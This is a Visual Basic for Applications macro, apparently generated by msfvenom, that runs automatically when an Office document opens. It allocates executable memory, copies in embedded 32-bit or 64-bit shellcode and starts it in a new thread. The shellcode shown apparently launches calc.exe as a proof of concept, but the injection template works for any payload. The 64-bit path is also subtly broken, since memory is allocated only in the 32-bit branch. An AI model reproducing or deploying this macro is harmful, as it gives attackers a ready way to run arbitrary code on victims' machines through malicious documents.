' msfvenom generated
#If VBA7 Then
        Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Quuncpt As Long, ByVal Niqneywbz As Long, ByVal Apf As LongPtr, Ssauemqf As Long, ByVal Hrjaqlfym As Long, Patuk As Long) As LongPtr
        Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Add As Long, ByVal Eldnzo As Long, ByVal Hvhk As Long, ByVal Kixxh As Long) As LongPtr
        Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Krldhufs As LongPtr, ByRef Gsvspq As Any, ByVal Djjdc As Long) As LongPtr
#Else
        Private Declare Function CreateThread Lib "kernel32" (ByVal Quuncpt As Long, ByVal Niqneywbz As Long, ByVal Apf As Long, Ssauemqf As Long, ByVal Hrjaqlfym As Long, Patuk As Long) As Long
        Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Add As Long, ByVal Eldnzo As Long, ByVal Hvhk As Long, ByVal Kixxh As Long) As Long
        Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Krldhufs As Long, ByRef Gsvspq As Any, ByVal Djjdc As Long) As Long
#End If

Sub Auto_Open()
        Dim Tpjln As Long, Kqrfipip As Variant, Rxsqoxe As Long
#If VBA7 Then
        Dim Clsghvido As LongPtr, Gczn As LongPtr
#Else
        Dim Clsghvido As Long, Gczn As Long
#End If
#If Win64 Then
        Kqrfipip = Array(72, 131, 228, 240, 232, 192, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, 210, 101, 72, 139, 82, 96, 72, 139, 82, 24, 72, 139, 82, 32, 72, 139, 114, 80, 72, 15, 183, 74, 74, 77, 49, 201, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 65, 81, 72, 139, 82, 32, 139, 66, 60, 72, 1, 208, 139, 128, 136, 0, _
0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 80, 139, 72, 24, 68, 139, 64, 32, 73, 1, 208, 227, 86, 72, 255, 201, 65, 139, 52, 136, 72, 1, 214, 77, 49, 201, 72, 49, 192, 172, 65, 193, 201, 13, 65, 1, 193, 56, 224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, 208, 102, 65, 139, 12, 72, 68, 139, 64, 28, 73, 1, _
208, 65, 139, 4, 136, 72, 1, 208, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 72, 139, 18, 233, 87, 255, 255, 255, 93, 72, 186, 1, 0, 0, 0, 0, 0, 0, 0, 72, 141, 141, 1, 1, 0, 0, 65, 186, 49, 139, 111, 135, 255, 213, 187, 240, 181, 162, 86, 65, 186, 166, 149, 189, 157, 255, 213, _
72, 131, 196, 40, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 89, 65, 137, 218, 255, 213, 99, 97, 108, 99, 46, 101, 120, 101, 0)
#Else
    Kqrfipip = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, _
207, 13, 1, 199, 56, 224, 117, 246, 3, 125, 248, 59, 125, 36, 117, 228, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 95, 95, 90, 139, 18, 235, 141, 93, 106, 1, 141, 133, 178, 0, 0, 0, 80, 104, 49, 139, 111, 135, 255, 213, 187, 240, 181, 162, 86, 104, 166, 149, _
189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213, 99, 97, 108, 99, 46, 101, 120, 101, 0)
        Clsghvido = VirtualAlloc(0, UBound(Kqrfipip), &H1000, &H40)
#End If
        For Rxsqoxe = LBound(Kqrfipip) To UBound(Kqrfipip)
                Tpjln = Kqrfipip(Rxsqoxe)
                Gczn = RtlMoveMemory(Clsghvido + Rxsqoxe, Tpjln, 1)
        Next Rxsqoxe
        Gczn = CreateThread(0, 0, Clsghvido, 0, 0, 0)
End Sub
Sub AutoOpen()
        Auto_Open
End Sub
Sub Workbook_Open()
        Auto_Open
End Sub


